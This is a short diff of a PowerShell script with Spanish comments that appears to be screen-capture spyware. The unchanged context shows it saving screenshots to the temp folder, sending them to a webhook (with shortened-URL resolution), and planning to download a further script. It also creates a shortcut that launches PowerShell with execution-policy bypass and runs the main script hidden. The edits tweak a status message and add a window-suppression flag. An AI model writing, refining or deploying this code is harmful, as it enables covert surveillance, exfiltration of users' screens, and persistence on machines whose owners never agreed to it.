@@ -4,7 +4,7 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!kk.." ; $hookurl = (irm $hookurl).url}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -40,7 +40,7 @@ do {
         $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($shortcutLocation)
         $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$syswPath`""
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -NoNewWindow -File `"$syswPath`""
         $shortcut.Save()
         
         # Ejecutar el script principal de manera oculta
